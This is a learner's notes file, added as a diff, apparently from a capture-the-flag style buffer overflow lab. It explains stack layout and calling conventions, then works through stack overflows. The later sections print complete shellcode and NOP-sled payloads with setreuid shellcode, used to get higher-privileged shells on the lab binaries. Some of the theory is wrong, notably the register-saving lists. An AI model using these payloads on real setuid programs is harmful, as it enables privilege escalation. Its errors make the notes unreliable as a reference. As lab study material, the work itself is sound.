@@ -1,0 +1,407 @@
+
+
+Buffer Overflows
+==================
+
+This is gonna be introductory buffer overflows... Current status of the topic... Is averagely ok to solve buffer overflows at low level.
+
+
+Process Layout
+===============
+
+Context switch:
+	Switching between processes quickly to make the processes look running as a multi task on a computer.
+
+So the first section, and now I am confident I am not even averagely familiar with buffer overflows.
+	
+	- Starting with the User Stack - Contiguous block of memory assigned by compiler at the run time.
+		- Note the below(note that memory is written from high memory address to low memory address) is empty space after user stack, it is unused memory just in case stack grows
+	- Then below that are shared library regions. Which are the space left for DLLs or other imports of some built-in or predefined files on a system.
+
+	- Below that is an empty space followed by heap... Yeaps, that empty space is for heap, just in case the heap grows...
+		- Note when the heap grows, it grows from lower address to higher address (what I presumed till now from the diagram).	
+
+	- Then at the end comes read/write data operations followed by code and variables used by program.
+
+The point here was to understand how processes are managed in real time.
+
+	Dynamic allcated memory: Heap.
+	Info about functions stored: Stack.
+
+Procedures
+===========
+
+Start is with a basic push and pop operations on stack.
+
+- The pop doesn't change the memory (i.e. do not delete the memory), it just reduces the value of rsp (stack pointer).
+
+- There are functions inside a program... They are, (when extracted in memory), known as stack frames... 
+	- Where each new stack frame is allocated when the function is called.
+
+Stack Top
+	- Stack frame 1
+	- Stack frame 2
+	- Stack frame 3
+Stack Bottom
+
+Note: The compiler compiles the files in order, it's not always the case that the entrypoint in a binary would start with a main function.
+
+Procedures Continued
+======================
+
+- caller function is what calls the other function inside it's body.
+	- The callee function is what getting a call from the another function to build up his own stack frame (jk, they don't build the stack frame, it's the processor; #MillenialHumour).
+
+Stack Top
+	Previous Stack Frame
+	Callee functions stack frame
+Stack Bottom
+
+- Now obviously there's an order of initializing stack frame, and setting up memory further...
+	- On the caller end, following procedures are carried out.
+
+	Stack Top
+		Prev stack frame
+		Stack frame; ebp for caller function (so as to set the base pointer back to where it was after returning from the callee function)
+		Stack pointer; esp for caller function (where this limits the scope of the the caller function).
+		Return Address (still part of the caller function; and this is the address where the eip points to after returning from the callee function).
+	Stack Bottom
+
+Note: Stack pointer part was not given in the room, I added that just to make sense to the further context.
+
+- Once, the callee function is finished executing the retq instruction is called. It does the following work for us:
+	- Pops the callee function off the stack (Deallocates the stack frame on callee function)
+	- pops the return address in rip.
+	- pops the stack pointer in rsp
+	- pops the stack frame address in rbp.
+
+Then the rip is on the next instruction after the function being called... Happy Ending.
+
+IMPORTANT NOTE: DO NOT FORGET THIS TIME...
+
+	- The functions until 32 bit processors were allowed(recommended; is more appropriate to use) to use only, 4 arguments at once. as there were only 4 available registers to use ig. edi,esi,ecx,edx.
+	esp and ebp were stack and base pointers and eax being the one to store the returned value of the function, ebx being used for something like a constant value (I noticed this in radare room, for printing the values with @ rbp-0x4 where 0x4 was the address of variable. ebp being the short version of it).
+
+	- The functions in 64 bit processors, having upto 6 arguments are stored in following registers:
+
+		rdi
+		rsi
+		rdx
+		rcx
+		r8
+		r9
+	- What happens to the rest of the parameters? They are stored on the stack frame.
+
+	Note that rax is a special register used for storing the values returned from a function. You might need this note later too.
+
+Confusion x100
+---------------
+
+- This part is confusing, it's based on how memory is managed over tough situations of excessive use of registers.
+
+- I am trying to make it as easy as possible.
+
+	- We can see that the function may store their value in registers... Now, what if their are other functions who want to store the value in that register too, as the registers are limited...
+	- What happens then is the value from the registers are stored onto the stack frame of the function that wants to use the register... Use the register then put the values back in it...
+		- This was the most of the confusion.
+
+Note: When initializing a stack frame, first the memory is allocated by the rsp on the stack(which actually creates the stack frame), then the instructions are loaded onto the stack frame, then the rip is pointed to the first instruction on that new stack frame.
+
+Here are some rules around which the registers are caller and callee saved:
+	- Caller saved:
+		rax
+		r10
+		r11
+	- Callee saved:
+		rdi
+		rsi
+		rdx
+		rcx
+		r8
+		r9
+		rbx
+		r12
+		r13
+		r14
+		rbp
+		rsp
+
+Note: This all happens when other functions are being called by the callee function then the values of registers are stored on the stack frame.
+
+	Stack Top
+		Arg n
+		Arg n-1
+		Arg n-2
+
+		Arg 1
+
+		<other instructions>
+
+		Return Address
+		Saved Registers and local variables
+	Stack Bottom
+
+A little note on Endianess
+============================
+
+I am kinda scared of this topic from the starting, because, THERE'S NO SENSE OF WRITING 69 AS 96... THAT'S JUST... ILLEGAL.
+
+- Different architectures actually represent the same hexadecimal number in different ways, and this is what is referred to as Endianess.
+
+Taking an example of 0x12345678
+	
+	Little endian:
+	LSB			MSB
+	78	56	34	12
+
+	Big endina:
+	MSB			LSB
+	12	34	56	78
+
+Note: Generally it is little endian.
+
+TBH, this was it for the boring theory part, Up ahead is the practical theory part.
+
+Overwriting variables
+=======================
+
+Analysis of overflow-1 binary.
+
+- With the prev knowledge we know that the memory is contiguous bytes of instructions... So, if want to change the value of the integer variable, it will be lying just side to the gets function on buffer.
+
+- gets() is a dangerous function as it doesn't have a length check, so bof becomes possible.
+
+NOTE: EVEN THE THOUGH STACK GROWS DOWNWARDS, BUT THE BUFFER COPIED INTO THE STACK IS WRITTEN FROM LOWER TO HIGHER MEMORY ADDRESS. 
+
+	- Depending on how the data entered into buffer it can be possible that to overwrite an integer.
+
+Practical:
+
+	It was simple to change the variable's value... Enter "a" more than 14 times... You got the variable's value changed.
+
+Overwriting Function Pointers
+==============================
+
+Ok, so I got stuck somewhere in between while doing the challenge... Because the rapid tables was giving wrong output... And I have to switch to cyberchef to get the correct output. and then finalize the payload... 
+
+	This was just a practical section no theory here.
+
+Practical
+-----------
+
+I found the memory address of the respective functions in radare2, and then converted that memory address in little endian format, and then into ascii.
+	- This is because the characters in the payload \x00, \x93 are 4 bytes each. but we need the program to read them as 1 so simple, convert them into Ascii.
+
+Special functions memory address:
+	\x67\x05\x40
+Other function's memory address in little endian format:
+	\x93\x05\x40
+
+
+Buffer Overflows
+=================
+
+- This is where things get real and interesting... The real buffer overflow, to exploit, and get root shell... CCOOOOLL
+
+Analyzing the binary
+----------------------
+
+Binary has 140 bytes of buffer to accept input.
+	
+- THE STRCPY FUNCTION DOESN'T CHECKS THE LENGTH OF THE INPUT BUFFER AS WELL, SO IT'S POSSIBLE FOR US TO OVERFLOW THE BUFFER. AS THEIR ARE NO CHECKS IN OUR PATH, FOR THE BUFFER WE INPUT TO CUT IN BETWEEN.
+
+- To create a shellcode first compile the binary that gives the shell... And then hexdump the binary... That is our shellcode.
+
+	Looks somewhat like this:
+
+		\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05
+
+- Now, even if we have the shellcode, it won't execute as the buffer input will take everything only as a string and string doesn't execute as code...
+
+	- For this we OVERWRITE THE RETURN ADDRESS OF THE FUNCTION TO THE PLACE WHERE OUR SHELLCODE STARTS.
+
+	- Also, we place our shellcode in the buffer because that's where we can input the data.
+
+THE PROCESS SO FAR IS:
+	
+	- Find out address of the buffer, and the start of the return address
+
+	- Then calculate the difference between these address, and identify how long can a shellcode can be(MAKE SURE THE SIZE OF SHELLCODE DOESN'T OVERWRITE THE RETURN ADDRES; WE NEED TO RESERVE THAT POINT FOR POINTING TOWARDS THE SHELLCODE.)
+
+	- Start by entering the shellcode at the start, then input the random bytes TO FILL THE SPACE UPTO THE START OF THE RETURN ADDRESS.
+
+	- Then at that start, put the address of the start of the buffer, that's where rip will start executing the shell code as opcode.
+
+
+Stack Top
+	Shellcode (inside buffer)
+	Random data (inside buffer)
+	Random data (overwritten saved registers)
+	Address of the buffer (overwritten old return address)
+Stack bottom
+
+Note: Remember the little endian format... But if you're creating the payload from msfvenom, that's already reversed.
+
+-------------------------------------------------------------
+
+That wasn't the end of the section, it was end of the theory... Now, down here, there is some practical explanation. As the above looks quite real and migh work well... 
+
+- In reality the memory addresses of start buffer and start of return address (we need) can change from various executions... or by changing the host for running the binary(To troubleshoot the binary on a local environment).
+
+- The thing here is, we can make this more flexible by using NOPs. 
+	- NOPs are opcode meaning NULL operation code, and they mean nothing. So when read by the system, it doesn't execute anything, and instead moves onto the next instruction.
+
+- THE USE OF NOPS ENSURE THAT THE ATTACKER CAN PUT THE RETURN ADDRESS ANYWHERE IN THE NOP REGION, AND EVENTUALLY COME TO EXECUTING THE SHELLCODE.
+
+	The injection vector looks something like this:
+
+	NOP sled	|	Shellcode 	| 	Memory address
+
+- You can use python to create the injection payload:
+
+	python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”
+
+- OR obviously msfvenom is there.
+
+Practical
+==========
+
+I am gonna copy the shellcode from writeup just for the sake of time, create your own with msfvenom and specify the bytes you need to set.
+
+We know the offset is 152 including the padding given by rbp. Which means, that at the 153rd byte starts our return address.
+
+So, we need to create a cache of 152 bytes (including our shellcode in it) then specify the return address.
+
+Let's first find our shellcode.
+
+	\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
+
+	This shellcode is 40 bytes... Which means we need a cache of 152-40=112 bytes... Ok, just for the sake of ease-ness let's use nops (same characters, easy to spot from the memory buffer and won't affect if the memory address of the shellcode somewhere changes; will found the way the rip).
+
+Now, let's find the return address.
+
+	run $(python -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + '\xb8\xe3\xff\xff\xff\x7f'")
+
+
+	x/100x $rsp-200 
+
+		Gave me the return address of the shellcode to be around
+
+		\xb8\xe3\xff\xff\xff\x7f
+
+		Let's input this in place of the 'BBBBBB'
+
+
+WOAHHOOOOOOOOOOOO GOT THE SHELLL... But here I am just the same user1... 
+
+Let's upgrade the shellcode given in the binary...
+
+	\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
+
+	and then again calculate the offset, which makes our final payload would look like...
+
+	run $(python -c "print '\x90'*86 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*12 + '\xb8\xe3\xff\xff\xff\x7f'")
+
+
+Strange we are still user1, well I guess that's something wrong with the gdb running as a user1 process.
+
+	./buffer-overflow $(python -c "print '\x90'*86 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*12 + '\xb8\xe3\xff\xff\xff\x7f'")
+
+
+	yeaps, finally got the user2 shell... 
+
+	Now, the next I will be doing without watching the writeup... 
+
+
+secret.txt:omgyoudidthissocool!!
+
+
+THE OVERFLOW-4
+================
+
+I am gonna keep it brief...
+
+	I used, /usr/share/metasploit-framework/tools/exploit/pattern-create.rb -l 200
+
+	And then used gdb on the host to run the output cache...
+
+I got the value in rbp as this...
+
+		0x4133664132664131
+
+	Then I used, /usr/share/metasploit-framework/tools/exploit/pattern-offset.rb -l 200 -q 0x4133664132664131
+
+	This gave me that the offset is 155 bytes. Later in the disas on main function, I saw their is a padding in rbp of around 8 bytes, so the total offset before the start of return address should be 155+8=163
+
+Great, let's verify this is gdb by running the following...
+
+	run $(python -c "print 'a'*190 + 'BBBBBB'")
+
+	Yeaps, worked perfectly, we overwrote the return address's 6 bytes. and that's what we need.
+
+Alright, let's move on to the shellcode...
+	
+	So for the shellcode let's find it online
+
+	\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
+
+	I am not sure about the shellcode, will verify later... The size of current shellcode is 24, offset 163...
+
+	So let's finalize our payload (leaving the starting address of the buffer aside)
+
+	run $(python -c "print '\x90'*90 + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + '\x90'*49 + 'AAAAAA'")
+
+	Great, we got the A's at the rip
+
+The final payload therefore will be 
+
+	run $(python -c "print '\x90'*90 + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + '\x90'*49 + '\xa8\xe3\xff\xff\xff\x7f'")
+
+
+Fingers crossed... 
+	
+	Oops, that didn't work but atleast we hit a sigill error, which means everything else was correct, EXCEPT SOME ILLEGAL INSTRUCTIONS...Hmm, the only meaningful code was the shellcode, which can give this error...
+
+So let's change the shellcode with the one given in the previous task's writeup
+
+	\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
+
+Ok, so this shellcode is 40 bytes, meaning we gotta change the padding as well
+
+	run $(python -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*33 + '\xa8\xe3\xff\xff\xff\x7f'")
+
+
+YEAAAAAAAAAAASSSSSSSSSSSSSSSSS, FINAL FUCKING LYYYYYY, Ohh, wait, we got the user1. Nvm... Let's see 
+
+Hmm, so for shellcode we can't use the previous one, because that is specifically for the user2's setreuid i.e. 1002... Let's use pwntools to craft a shellcode with setreuid as 1003.
+	- Now, personally, I don't have any idea how to do that... So am gonna view it from the README on their github.
+
+	This is a 64 bit system... so we can use the following command to craft a shellcode 
+
+		shellcraft amd64.linux.setreuid 1003 -f d
+
+	Note: -f d adds the escape character at the end...
+
+		\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+
+Let's add this infront of the previous shellcode, which will make our TOTAL WORKING PAYLOAD LOOK LIKE THIS(with changed padding further...
+
+	run $(python -c "print '\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\xa8\xe3\xff\xff\xff\x7f'")
+
+Oops forgot again, it won't work with gdb...
+
+	./buffer-overflow-2 $(python -c "print '\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\xa8\xe3\xff\xff\xff\x7f'")
+
+
+secret.txt:wowanothertime!!
+
+Peace.
+
+Final Notes
+-------------
+
+- I was wrong before, the return address doesn't change on every execution... The return address might change after a boot up or with the same binary on another computer... But won't change in a same session. BUT MIGHT CHANGE ON EVERY EXECUTION... IFFF ASLR(Address space layout randomization) PROTECTION IS ON.
+
+- Whatever the final payload is, and giving a shell and not getting you the updated user, then it's either you're running it in gdb... Or setreuid is not set to the user, the binary has permission to run as.
+
+Finally did this room... 
